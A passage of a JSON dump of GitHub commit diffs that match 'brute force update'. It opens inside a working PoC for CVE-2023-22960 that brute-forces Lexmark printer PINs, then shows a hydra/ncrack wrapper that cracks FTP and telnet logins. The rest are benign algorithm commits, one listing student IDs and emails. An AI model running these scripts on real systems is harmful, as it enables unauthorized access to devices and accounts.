'\\033[0m'\nBOLD = '\\033[1m'\nORANGE = '\\033[0;38;5;214m'\nGREEN = '\\033[38;5;82m'\n\nMAIN_BULLET = f'[{MAIN}*{END}]'\n\n# Threading\nmax_threads = 80\nthread_limiter = threading.BoundedSemaphore(max_threads)\n\n# Request\n# The login URL below might not be exactly the same for all printer models. You may need to edit the resource \/webglue\/session\/create\nlogin_url = f'{args.protocol}:\/\/{args.target}\/webglue\/session\/create'\n\nheaders = {\n\t'User-Agent': 'Mozilla\/5.0 (X11; Linux x86_64; rv:102.0) Gecko\/20100101 Firefox\/102.0',\n\t'Accept': 'application\/json, text\/javascript, *\/*; q=0.01',\n\t'Accept-Language': 'en-US,en;q=0.5',\n\t'Accept-Encoding': 'gzip, deflate, br',\n\t'Content-Type': 'application\/x-www-form-urlencoded; charset=utf-8',\n\t'X-Requested-With': 'XMLHttpRequest',\n\t'Connection': 'keep-alive',\n\t'Cookie': 'lang=en; autoLogin=false',\n\t'Sec-Fetch-Dest': 'empty',\n\t'Sec-Fetch-Mode': 'cors',\n\t'Sec-Fetch-Site': 'same-origin'\n}\n\n# PINS\ndef get_file_contents(path):\n\t\n\tf = open(path, 'r')\n\tcontents = f.readlines()\n\tf.close()\n\treturn contents\n\t\n\t\npins = get_file_contents(args.pins_file)\npins_count = len(pins)\n\n\ndef bruteforce(pin):\n\t\n\tthread_limiter.acquire()\n\tpin = pin.strip()\n\tauthId = randint(-100000, 1000000)\n\tdata = '{\"authtype\" : 3, \"authId\" : ' + str(authId) + ', \"creds\": {\"pin\" : \"' + pin + '\"}}'\n\tpost_req_data = {'data':data, 'lang':'en'}\n\t\n\ttry:\t\n\t\tresponse = requests.post(url = login_url, data = post_req_data, verify = False, allow_redirects = False, headers = headers)\n\t\tcontent = response.content.decode()\t\n\n\t\tif re.search('sessionId', content):\t\t\t\t\n\t\t\tprint(f'Match: {GREEN}{pin}{END} ' + content)\n\n\t\t# Comment out the else statement for non verbose output\t\n\t\telse:\n\t\t\tprint(f'{ORANGE}{pin}{END} ' + content)\n\n\texcept:\n\t\tprint(f'{FAIL}FAIL{END} Something went wrong. [status: {response.status_code}]')\n\t\t\n\tfinally:\n\t\tthread_limiter.release()\n\n\n\ndef main():\n\t\n\tprint(f'\\n{MAIN_BULLET} PoC for CVE-2023-22960 by t3l3machus (https:\/\/github.com\/t3l3machus)')\n\tprint(f'{MAIN_BULLET} Initiating PIN authentication brute force attack against: {login_url}')\n\tprint(f'{MAIN_BULLET} Number of PINs loaded: {pins_count}')\n\tprint(f'{MAIN_BULLET} Successful attempts will be logged below (if any):')\n\t\t\n\tfor pin in pins:\n\t\tthreading.Thread(target = bruteforce, args = (pin.strip(),)).start()\n\n\nif __name__ == '__main__':\n\tmain()\n\t\t\n"}},"msg":"Update lexmark-brute-force-pins.py"}},"https:\/\/github.com\/emircetinmemis\/maximum-subarray-sum-expandation":{"df5842d84a309d29c6550b1c471d41f656afde6b":{"url":"https:\/\/api.github.com\/repos\/emircetinmemis\/maximum-subarray-sum-expandation\/commits\/df5842d84a309d29c6550b1c471d41f656afde6b","html_url":"https:\/\/github.com\/emircetinmemis\/maximum-subarray-sum-expandation\/commit\/df5842d84a309d29c6550b1c471d41f656afde6b","message":"Update brute_force.py","sha":"df5842d84a309d29c6550b1c471d41f656afde6b","keyword":"brute force update","diff":"diff --git a\/Algorithms\/brute_force.py b\/Algorithms\/brute_force.py\nindex 4917ebb..5cf9799 100644\n--- a\/Algorithms\/brute_force.py\n+++ b\/Algorithms\/brute_force.py\n@@ -1,12 +1,12 @@\n \"\"\"\n @Script, that implements an own-design naive algorithm to find a contiguous subarray with the largest sum as an external method.\n \n-@Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\"\n-@Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\"\n+@Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\" & \"Tuana Selen Ozhazday\"\n+@Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\" & \"Tuana Selen Ozhazday\"\n \n-@Student_1:     \"Emir Cetin Memis\"    |   @Student_2:     \"Emircan Yaprak\"\n-@StudentID_1:   041901027             |   @StudentID_2:   041901009\n-@Contact_1:     \"memise@mef.edu.tr\"   |   @Contact_2:     \"yaprakem@mef.edu.tr\"\n+@Student_1:     \"Emir Cetin Memis\"    |   @Student_2:     \"Emircan Yaprak\"        |   @Student_3:     \"Tuana Selen Ozhazday\"\n+@StudentID_1:   041901027             |   @StudentID_2:   041901009               |   @StudentID_3:   041901024\n+@Contact_1:     \"memise@mef.edu.tr\"   |   @Contact_2:     \"yaprakem@mef.edu.tr\"   |   @Contact_3:     \"ozhazdaytm@mef.edu.tr\"\n \n @Set&Rights: \"MEF University\"\n @Instructor: \"Prof. Dr. Muhittin Gokmen\"\n@@ -78,4 +78,4 @@ def _brute_force(self, array:list) -> tuple :\n \n     # Driver method.\n     def solve(self, inputArray:list) -> tuple :\n-        return self._brute_force(inputArray)\n\\ No newline at end of file\n+        return self._brute_force(inputArray)\n","files":{"\/Algorithms\/brute_force.py":{"changes":[{"diff":"\n \"\"\"\n @Script, that implements an own-design naive algorithm to find a contiguous subarray with the largest sum as an external method.\n \n-@Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\"\n-@Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\"\n+@Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\" & \"Tuana Selen Ozhazday\"\n+@Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\" & \"Tuana Selen Ozhazday\"\n \n-@Student_1:     \"Emir Cetin Memis\"    |   @Student_2:     \"Emircan Yaprak\"\n-@StudentID_1:   041901027             |   @StudentID_2:   041901009\n-@Contact_1:     \"memise@mef.edu.tr\"   |   @Contact_2:     \"yaprakem@mef.edu.tr\"\n+@Student_1:     \"Emir Cetin Memis\"    |   @Student_2:     \"Emircan Yaprak\"        |   @Student_3:     \"Tuana Selen Ozhazday\"\n+@StudentID_1:   041901027             |   @StudentID_2:   041901009               |   @StudentID_3:   041901024\n+@Contact_1:     \"memise@mef.edu.tr\"   |   @Contact_2:     \"yaprakem@mef.edu.tr\"   |   @Contact_3:     \"ozhazdaytm@mef.edu.tr\"\n \n @Set&Rights: \"MEF University\"\n @Instructor: \"Prof. Dr. Muhittin Gokmen\"\n","add":5,"remove":5,"filename":"\/Algorithms\/brute_force.py","badparts":["@Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\"","@Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\"","@Student_1:     \"Emir Cetin Memis\"    |   @Student_2:     \"Emircan Yaprak\"","@StudentID_1:   041901027             |   @StudentID_2:   041901009","@Contact_1:     \"memise@mef.edu.tr\"   |   @Contact_2:     \"yaprakem@mef.edu.tr\""],"goodparts":["@Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\" & \"Tuana Selen Ozhazday\"","@Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\" & \"Tuana Selen Ozhazday\"","@Student_1:     \"Emir Cetin Memis\"    |   @Student_2:     \"Emircan Yaprak\"        |   @Student_3:     \"Tuana Selen Ozhazday\"","@StudentID_1:   041901027             |   @StudentID_2:   041901009               |   @StudentID_3:   041901024","@Contact_1:     \"memise@mef.edu.tr\"   |   @Contact_2:     \"yaprakem@mef.edu.tr\"   |   @Contact_3:     \"ozhazdaytm@mef.edu.tr\""]},{"diff":"\n \n     # Driver method.\n     def solve(self, inputArray:list) -> tuple :\n-        return self._brute_force(inputArray)\n\\ No newline at end of file\n+        return self._brute_force(inputArray)\n","add":1,"remove":1,"filename":"\/Algorithms\/brute_force.py","badparts":["        return self._brute_force(inputArray)"],"goodparts":["        return self._brute_force(inputArray)"]}],"source":"\n\"\"\" @Script, that implements an own-design naive algorithm to find a contiguous subarray with the largest sum as an external method. @Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\" @Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\" @Student_1: \"Emir Cetin Memis\" | @Student_2: \"Emircan Yaprak\" @StudentID_1: 041901027 | @StudentID_2: 041901009 @Contact_1: \"memise@mef.edu.tr\" | @Contact_2: \"yaprakem@mef.edu.tr\" @Set&Rights: \"MEF University\" @Instructor: \"Prof. Dr. Muhittin Gokmen\" @Course: \"Analysis of Algorithms\" @Req: \"Project 1\" @Since: 11\/27\/2022 \"\"\" from math import inf class ClassBruteForce: def __init__(self) -> None: self.iterations={ \"A\":0, \"B\":0, \"C\":0, \"D\":0, \"E\":0, \"F\":0, \"G\":0, \"H\":0, \"I\":0, \"J\":0, \"K\":0, \"L\":0, \"M\":0, \"N\":0, \"O\":0, \"P\":0, } def _brute_force(self, array:list) -> tuple: maximumSum=-inf ; self.iterations[\"A\"] +=1 startIndex=0 ; self.iterations[\"B\"] +=1 endIndex =0 ; self.iterations[\"C\"] +=1 for currentIndex in range(len(array)): pass ; self.iterations[\"D\"] +=1 currentSum=array[currentIndex] ; self.iterations[\"E\"] +=1 if(currentSum > maximumSum): pass ; self.iterations[\"F\"] +=1 maximumSum=currentSum ; self.iterations[\"G\"] +=1 startIndex=currentIndex ; self.iterations[\"H\"] +=1 endIndex =currentIndex ; self.iterations[\"I\"] +=1 for j in range(currentIndex+1, len(array)): pass ; self.iterations[\"J\"] +=1 currentSum +=array[j] ; self.iterations[\"K\"] +=1 if(currentSum > maximumSum): pass ; self.iterations[\"L\"] +=1 maximumSum=currentSum ; self.iterations[\"M\"] +=1 startIndex=currentIndex ; self.iterations[\"N\"] +=1 endIndex =j ; self.iterations[\"O\"] +=1 pass ; self.iterations[\"P\"] +=1 return( startIndex, endIndex, maximumSum, self.iterations ) def solve(self, inputArray:list) -> tuple: return self._brute_force(inputArray) ","sourceWithComments":"\"\"\"\n@Script, that implements an own-design naive algorithm to find a contiguous subarray with the largest sum as an external method.\n\n@Owns: \"Emir Cetin Memis\" & \"Emircan Yaprak\"\n@Contiributors: \"Emir Cetin Memis\" & \"Emircan Yaprak\"\n\n@Student_1:     \"Emir Cetin Memis\"    |   @Student_2:     \"Emircan Yaprak\"\n@StudentID_1:   041901027             |   @StudentID_2:   041901009\n@Contact_1:     \"memise@mef.edu.tr\"   |   @Contact_2:     \"yaprakem@mef.edu.tr\"\n\n@Set&Rights: \"MEF University\"\n@Instructor: \"Prof. Dr. Muhittin Gokmen\"\n@Course:     \"Analysis of Algorithms\"\n@Req:        \"Project 1\"\n\n@Since: 11\/27\/2022\n\"\"\"\n\nfrom math import inf\n\nclass ClassBruteForce :\n\n    def __init__(self) -> None :\n\n        self.iterations = {\n            \"A\":0,\n            \"B\":0,\n            \"C\":0,\n            \"D\":0,\n            \"E\":0,\n            \"F\":0,\n            \"G\":0,\n            \"H\":0,\n            \"I\":0,\n            \"J\":0,\n            \"K\":0,\n            \"L\":0,\n            \"M\":0,\n            \"N\":0,\n            \"O\":0,\n            \"P\":0,\n        }\n\n    # Method that implements the naive algorithm.\n    # @param list array: The array that will be used to find the subarray with the largest sum.\n    # @return tuple: The tuple that contains the start index, end index and the sum of the subarray with the largest sum.\n    def _brute_force(self, array:list) -> tuple :\n\n        maximumSum = -inf                                       ; self.iterations[\"A\"] += 1\n        startIndex = 0                                          ; self.iterations[\"B\"] += 1\n        endIndex   = 0                                          ; self.iterations[\"C\"] += 1\n\n        for currentIndex in range(len(array)) :\n            pass                                                ; self.iterations[\"D\"] += 1\n            currentSum = array[currentIndex]                    ; self.iterations[\"E\"] += 1\n            if (currentSum > maximumSum) :\n                pass                                            ; self.iterations[\"F\"] += 1\n                maximumSum = currentSum                         ; self.iterations[\"G\"] += 1\n                startIndex = currentIndex                       ; self.iterations[\"H\"] += 1\n                endIndex   = currentIndex                       ; self.iterations[\"I\"] += 1\n\n            for j in range(currentIndex+1, len(array)) :\n                pass                                            ; self.iterations[\"J\"] += 1\n                currentSum += array[j]                          ; self.iterations[\"K\"] += 1\n                if (currentSum > maximumSum) :\n                    pass                                        ; self.iterations[\"L\"] += 1\n                    maximumSum = currentSum                     ; self.iterations[\"M\"] += 1\n                    startIndex = currentIndex                   ; self.iterations[\"N\"] += 1\n                    endIndex   = j                              ; self.iterations[\"O\"] += 1\n\n        pass                                                    ; self.iterations[\"P\"] += 1\n        return ( \n            startIndex, \n            endIndex, \n            maximumSum,\n            self.iterations\n        )\n\n    # Driver method.\n    def solve(self, inputArray:list) -> tuple :\n        return self._brute_force(inputArray)"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/CeferovOrxan\/qisayollar":{"f1efbe09f0f990d7e84f5337115e2e2e370eac77":{"url":"https:\/\/api.github.com\/repos\/CeferovOrxan\/qisayollar\/commits\/f1efbe09f0f990d7e84f5337115e2e2e370eac77","html_url":"https:\/\/github.com\/CeferovOrxan\/qisayollar\/commit\/f1efbe09f0f990d7e84f5337115e2e2e370eac77","message":"Update brute_force.py","sha":"f1efbe09f0f990d7e84f5337115e2e2e370eac77","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex efb292e..1b65d34 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -28,9 +28,9 @@\n sifreler = input(\"Sifrelerin Oldugu Faylin Yolu: \")\n \n if(sayino==\"1\"):\n-        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n+        os.system(\"ncrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n elif(sayino==\"2\"):\n-        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n+        os.system(\"ncrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n elif(sayino==\"3\"):\n         os.system(\"hydra -L \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP + \"telnet\")\n else:\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n sifreler = input(\"Sifrelerin Oldugu Faylin Yolu: \")\n \n if(sayino==\"1\"):\n-        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n+        os.system(\"ncrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n elif(sayino==\"2\"):\n-        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n+        os.system(\"ncrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\n elif(sayino==\"3\"):\n         os.system(\"hydra -L \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP + \"telnet\")\n else:\n","add":2,"remove":2,"filename":"\/brute_force.py","badparts":["        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)","        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)"],"goodparts":["        os.system(\"ncrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)","        os.system(\"ncrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)"]}],"source":"\n import os os.system(\"apt-get install figlet\") os.system(\"clear\") os.system(\"figlet Brute_Force\") print(\"\"\" (((: Xos geldin HACKER:))) 1) FTP 2) SSH 3) Telnet 4) HTTP 5) SMB 6) ROP 7) SIP 8) Redis 9) VNC 10) PostgreSQL 11) MySQL \"\"\") sayino=input(\"Sayini Daxil Et: \") hedefIP=input(\"Hedef IP Daxil Et: \") istifadeciadi=input(\"Istifadeci Adi Fayl Yolu: \") sifreler=input(\"Sifrelerin Oldugu Faylin Yolu: \") if(sayino==\"1\"): os.system(\"nrack -p 21 -u \" +istifadeciadi +\" -P \" +sifreler +\" \" +hedefIP) elif(sayino==\"2\"): os.system(\"nrack -p 21 -u \" +istifadeciadi +\" -P \" +sifreler +\" \" +hedefIP) elif(sayino==\"3\"): os.system(\"hydra -L \" +istifadeciadi +\" -P \" +sifreler +\" \" +hedefIP +\"telnet\") else: print(\"): DIGER SECIMLER MUVEQQETI OLARAQ ISLEMIR TEZLIKLE BERPA OLUNACAQ:( \") ","sourceWithComments":"#!\/usr\/bin\/env python\n\nimport os \n\nos.system(\"apt-get install figlet\")\nos.system(\"clear\")\nos.system(\"figlet Brute_Force\")\nprint (\"\"\" \n     (((:  Xos geldin HACKER :)))\n     \n1) FTP\n2) SSH\n3) Telnet\n4) HTTP\n5) SMB\n6) ROP\n7) SIP\n8) Redis\n9) VNC     \n10) PostgreSQL\n11) MySQL    \n\n\"\"\")\n\nsayino = input(\"Sayini Daxil Et: \")\nhedefIP = input(\"Hedef IP Daxil Et: \")\nistifadeciadi = input(\"Istifadeci Adi Fayl Yolu: \")\nsifreler = input(\"Sifrelerin Oldugu Faylin Yolu: \")\n\nif(sayino==\"1\"):\n        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\nelif(sayino==\"2\"):\n        os.system(\"nrack -p 21 -u \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP)\nelif(sayino==\"3\"):\n        os.system(\"hydra -L \" + istifadeciadi + \" -P \" + sifreler + \" \" + hedefIP + \"telnet\")\nelse:\n        print(\" ): DIGER SECIMLER MUVEQQETI OLARAQ ISLEMIR TEZLIKLE BERPA OLUNACAQ :( \")\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/ScorpionOuss\/HashCodeTraining":{"e6de7e9c45b41ba0809147d8af6dbb6fc925dfca":{"url":"https:\/\/api.github.com\/repos\/ScorpionOuss\/HashCodeTraining\/commits\/e6de7e9c45b41ba0809147d8af6dbb6fc925dfca","html_url":"https:\/\/github.com\/ScorpionOuss\/HashCodeTraining\/commit\/e6de7e9c45b41ba0809147d8af6dbb6fc925dfca","message":"Update brute force","sha":"e6de7e9c45b41ba0809147d8af6dbb6fc925dfca","keyword":"brute force update","diff":"diff --git a\/Rides\/brute_force.py b\/Rides\/brute_force.py\nindex 269c237..9bdbab2 100644\n--- a\/Rides\/brute_force.py\n+++ b\/Rides\/brute_force.py\n@@ -1,27 +1,46 @@\n #!\/usr\/bin\/env python3\n+from common_library import Rides, R, C, F, N, B, T\n+from common_library import evaluate\n+from copy import deepcopy\n \n+# R = 0  # number of rows of the grid\n+# C = 0  # number of columns of the grid\n+# F = 0  # number of vehicles in the fleet\n+# N = 0  # number of rides\n+# B = 0  # per-ride bonus for starting the ride on time\n+# T = 0  # number of steps in the simulation\n+# Rides = []  # list of rides\n \n- \n \n-\n-def evaluate(solution):\n-    return 0\n-\n-def find_optimum(fleets, rides, T, B):\n+def find_optimum():\n     \"\"\"\n     Return the optimal solution using the brute force approach\n     \"\"\"\n     current_solution = None\n+    current_score = 0\n \n-    fleets_list = [[]for _ in range(fleets)]\n+    fleets_list = [[]for _ in range(F)]\n     def recursive_enumeration(r):\n-        if r == len(rides):\n+        if r == N:\n             test_score = evaluate(fleets_list)\n             # May need a copy\n-            current_solution = max(current_solution, fleets_list, key = evaluate)\n-        for i in range(fleets):\n-            fleets_list[i].append(rides[r])\n+            if test_score > current_score:\n+                current_solution = deepcopy(fleets_list)\n+        for i in range(F):\n+            fleets_list[i].append(Rides[r])\n+            # A first evaluation Here\n+            # What would be the suitabke data structure.\n+            \n+            # if not validate(fleets_list):\n+            #     pass\n+\n+            # N = 10\n+            # F1 = 3 (1)\n+            # F2 = 4 (2)\n+            # F3 = 4 (2)\n+\n             recursive_enumeration(r+1)\n             fleets_list[i].pop()\n-\n-    return\n\\ No newline at end of file\n+    \n+    recursive_enumeration(0)\n+    return current_solution\n\\ No newline at end of file\n","files":{"\/Rides\/brute_force.py":{"changes":[{"diff":"\n #!\/usr\/bin\/env python3\n+from common_library import Rides, R, C, F, N, B, T\n+from common_library import evaluate\n+from copy import deepcopy\n \n+# R = 0  # number of rows of the grid\n+# C = 0  # number of columns of the grid\n+# F = 0  # number of vehicles in the fleet\n+# N = 0  # number of rides\n+# B = 0  # per-ride bonus for starting the ride on time\n+# T = 0  # number of steps in the simulation\n+# Rides = []  # list of rides\n \n- \n \n-\n-def evaluate(solution):\n-    return 0\n-\n-def find_optimum(fleets, rides, T, B):\n+def find_optimum():\n     \"\"\"\n     Return the optimal solution using the brute force approach\n     \"\"\"\n     current_solution = None\n+    current_score = 0\n \n-    fleets_list = [[]for _ in range(fleets)]\n+    fleets_list = [[]for _ in range(F)]\n     def recursive_enumeration(r):\n-        if r == len(rides):\n+        if r == N:\n             test_score = evaluate(fleets_list)\n             # May need a copy\n-            current_solution = max(current_solution, fleets_list, key = evaluate)\n-        for i in range(fleets):\n-            fleets_list[i].append(rides[r])\n+            if test_score > current_score:\n+                current_solution = deepcopy(fleets_list)\n+        for i in range(F):\n+            fleets_list[i].append(Rides[r])\n+            # A first evaluation Here\n+            # What would be the suitabke data structure.\n+            \n+            # if not validate(fleets_list):\n+            #     pass\n+\n+            # N = 10\n+            # F1 = 3 (1)\n+            # F2 = 4 (2)\n+            # F3 = 4 (2)\n+\n             recursive_enumeration(r+1)\n             fleets_list[i].pop()\n-\n-    return\n\\ No newline at end of file\n+    \n+    recursive_enumeration(0)\n+    return current_solution\n\\ No newline at end of file\n","add":32,"remove":13,"filename":"\/Rides\/brute_force.py","badparts":["def evaluate(solution):","    return 0","def find_optimum(fleets, rides, T, B):","    fleets_list = [[]for _ in range(fleets)]","        if r == len(rides):","            current_solution = max(current_solution, fleets_list, key = evaluate)","        for i in range(fleets):","            fleets_list[i].append(rides[r])","    return"],"goodparts":["from common_library import Rides, R, C, F, N, B, T","from common_library import evaluate","from copy import deepcopy","def find_optimum():","    current_score = 0","    fleets_list = [[]for _ in range(F)]","        if r == N:","            if test_score > current_score:","                current_solution = deepcopy(fleets_list)","        for i in range(F):","            fleets_list[i].append(Rides[r])","    recursive_enumeration(0)","    return current_solution"]}],"source":"\n def evaluate(solution): return 0 def find_optimum(fleets, rides, T, B): \"\"\" Return the optimal solution using the brute force approach \"\"\" current_solution=None fleets_list=[[]for _ in range(fleets)] def recursive_enumeration(r): if r==len(rides): test_score=evaluate(fleets_list) current_solution=max(current_solution, fleets_list, key=evaluate) for i in range(fleets): fleets_list[i].append(rides[r]) recursive_enumeration(r+1) fleets_list[i].pop() return ","sourceWithComments":"#!\/usr\/bin\/env python3\n\n\n \n\n\ndef evaluate(solution):\n    return 0\n\ndef find_optimum(fleets, rides, T, B):\n    \"\"\"\n    Return the optimal solution using the brute force approach\n    \"\"\"\n    current_solution = None\n\n    fleets_list = [[]for _ in range(fleets)]\n    def recursive_enumeration(r):\n        if r == len(rides):\n            test_score = evaluate(fleets_list)\n            # May need a copy\n            current_solution = max(current_solution, fleets_list, key = evaluate)\n        for i in range(fleets):\n            fleets_list[i].append(rides[r])\n            recursive_enumeration(r+1)\n            fleets_list[i].pop()\n\n    return"}},"msg":"Update brute force"}},"https:\/\/github.com\/Xavierleeeugene\/Cryptography-DHKE-Vigenere-Ciphere-Security-Analysis":{"72aa89f36882d85b2e97d736a7acdc75420dc4a0":{"url":"https:\/\/api.github.com\/repos\/Xavierleeeugene\/Cryptography-DHKE-Vigenere-Ciphere-Security-Analysis\/commits\/72aa89f36882d85b2e97d736a7acdc75420dc4a0","html_url":"https:\/\/github.com\/Xavierleeeugene\/Cryptography-DHKE-Vigenere-Ciphere-Security-Analysis\/commit\/72aa89f36882d85b2e97d736a7acdc75420dc4a0","sha":"72aa89f36882d85b2e97d736a7acdc75420dc4a0","keyword":"brute force update","diff":"diff --git a\/__pycache__\/brute1.cpython-38.pyc b\/__pycache__\/brute1.cpython-38.pyc\nindex 8877e0b..2cb242b 100644\nBinary files a\/__pycache__\/brute1.cpython-38.pyc and b\/__pycache__\/brute1.cpython-38.pyc differ\ndiff --git a\/brute1.py b\/brute1.py\nindex 8d0f691..54a52e7 100644\n--- a\/brute1.py\n+++ b\/brute1.py\n@@ -47,7 +47,7 @@ def brute(pt, ct):\n         sys.stdout.flush()\n \n         if newCT == ct:\n-            print(\"Key Found: \" + i)\n+            print(\"\\nKey Found: \" + i)\n             print(\"Total Tries:\", counter)\n             return i\n \n","message":"","files":{"\/brute1.py":{"changes":[{"diff":"\n         sys.stdout.flush()\n \n         if newCT == ct:\n-            print(\"Key Found: \" + i)\n+            print(\"\\nKey Found: \" + i)\n             print(\"Total Tries:\", counter)\n             return i\n \n","add":1,"remove":1,"filename":"\/brute1.py","badparts":["            print(\"Key Found: \" + i)"],"goodparts":["            print(\"\\nKey Found: \" + i)"]}],"source":"\nimport time import vigenere import sys key_gen=[] alphabet=list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !') c1=0 c2=0 c3=0 c4=0 for i in range(32**4): output=\"\" output +=alphabet[c1] output +=alphabet[c2] output +=alphabet[c3] output +=alphabet[c4] if c4 < 31: c4 +=1 elif c3 < 31: c4=0 c3 +=1 elif c2 < 31: c3=0 c4=0 c2 +=1 else: c2=0 c3=0 c4=0 c1 +=1 key_gen.append(output) def brute(pt, ct): counter=0 for i in key_gen: counter +=1 key_test=[j for j in i] sys.stdout.write('\\r' +\"Currently Testing Key: \" +i) time.sleep(0.000001) newCT=vigenere.convert_text(key_test,pt,1) sys.stdout.flush() if newCT==ct: print(\"Key Found: \" +i) print(\"Total Tries:\", counter) return i return -1 ","sourceWithComments":"import time\nimport vigenere\nimport sys\n\nkey_gen = []\nalphabet = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !')\n\nc1 = 0\nc2 = 0\nc3 = 0\nc4 = 0\n\nfor i in range(32**4):\n    output = \"\"\n    output += alphabet[c1]\n    output += alphabet[c2]\n    output += alphabet[c3]\n    output += alphabet[c4]\n\n    if c4 < 31:\n        c4 += 1\n    elif c3 < 31:\n        c4 = 0\n        c3 += 1\n\n    elif c2 < 31:\n        c3 = 0\n        c4 = 0\n        c2 += 1\n\n    else:\n        c2 = 0\n        c3 = 0\n        c4 = 0\n        c1 += 1\n    \n    key_gen.append(output)\n\ndef brute(pt, ct):\n    counter = 0\n    for i in key_gen:\n        counter += 1\n        key_test = [j for j in i]\n        sys.stdout.write('\\r' + \"Currently Testing Key: \" + i)\n        time.sleep(0.000001)\n        newCT = vigenere.convert_text(key_test,pt,1)\n        sys.stdout.flush()\n\n        if newCT == ct:\n            print(\"Key Found: \" + i)\n            print(\"Total Tries:\", counter)\n            return i\n\n    return -1\n\n"}},"msg":"Update Brute Force"}},"https:\/\/github.com\/denx20\/CS-590-Project":{"1cf5325e9a805022081ebc4e1a5bdf32fa24aeef":{"url":"https:\/\/api.github.com\/repos\/denx20\/CS-590-Project\/commits\/1cf5325e9a805022081ebc4e1a5bdf32fa24aeef","html_url":"https:\/\/github.com\/denx20\/CS-590-Project\/commit\/1cf5325e9a805022081ebc4e1a5bdf32fa24aeef","message":"Update brute_force_solver.py","sha":"1cf5325e9a805022081ebc4e1a5bdf32fa24aeef","keyword":"brute force update","diff":"diff --git a\/brute_force_solver.py b\/brute_force_solver.py\nindex d44c93c..68baeea 100644\n--- a\/brute_force_solver.py\n+++ b\/brute_force_solver.py\n@@ -26,7 +26,7 @@ def brute_force_grid_search(sequence, upper_bound = 5, lower_bound = -5, break_t\n \n   def int_to_base_helper(num, base):\n     ret = []\n-    while num >= base:\n+    while num > 0:\n       ret.append(num % base)\n       num = num \/\/ base\n     return ret\n","files":{"\/brute_force_solver.py":{"changes":[{"diff":"\n \n   def int_to_base_helper(num, base):\n     ret = []\n-    while num >= base:\n+    while num > 0:\n       ret.append(num % base)\n       num = num \/\/ base\n     return ret\n","add":1,"remove":1,"filename":"\/brute_force_solver.py","badparts":["    while num >= base:"],"goodparts":["    while num > 0:"]}],"source":"\nfrom copy import deepcopy from function import Function, FunctionTerm candidate_term_list=[ FunctionTerm('constant'), FunctionTerm('loc_term', exponent1=1), FunctionTerm('power_term', index_diff1=1), FunctionTerm('power_term', index_diff1=2), FunctionTerm('loc_term', exponent1=2), FunctionTerm('loc_term', exponent1=3), FunctionTerm('interaction_term', exponent1=1, exponent2=1, index_diff1=1, index_diff2=2) ] def brute_force_grid_search(sequence, upper_bound=5, lower_bound=-5, break_threshold=7): coeff=sorted(list(range(upper_bound, lower_bound-1, -1)), key=lambda x: abs(x)) base=len(coeff) digit_to_coeff={i: coeff[i] for i in range(base)} i=0 def int_to_base_helper(num, base): ret=[] while num >=base: ret.append(num % base) num=num \/\/ base return ret while True: for j in range(base**i, base**(i+1)): if j==0: continue term_coeffs=[digit_to_coeff[c] for c in int_to_base_helper(j, base)]+[0]*50 f=Function() for k, term in enumerate(candidate_term_list): if term_coeffs[k] !=0: term_copy=deepcopy(term) term_copy.updateCoeff(term_coeffs[k]) f.addTerm(term_copy) if f.startIndex() > len(sequence): continue perfect_fit=True for n in range(f.startIndex(), len(sequence)+1): if f.evaluate(sequence, n) !=sequence[n-1]: perfect_fit=False break if perfect_fit: return f i +=1 print('i=',i) if i >=break_threshold: print(f'Search terminated! Searched{base}^{break_threshold} combinations but cannot find solution') return None ","sourceWithComments":"from copy import deepcopy\nfrom function import Function, FunctionTerm\n\n\n# TODO: either manually make this list longer, or convert it into a generator\ncandidate_term_list = [\n  FunctionTerm('constant'),\n  FunctionTerm('loc_term', exponent1=1), # n\n  FunctionTerm('power_term', index_diff1=1), # f[n-1]\n  FunctionTerm('power_term', index_diff1=2), # f[n-2]\n  FunctionTerm('loc_term', exponent1=2), # n^2\n  #FunctionTerm('power_term', index_diff1=3), # f[n-3]\n  FunctionTerm('loc_term', exponent1=3), # n^3\n  FunctionTerm('interaction_term', exponent1=1, exponent2=1, index_diff1=1, index_diff2=2) # f[n-1]*f[n-2]\n]\n\n\n\ndef 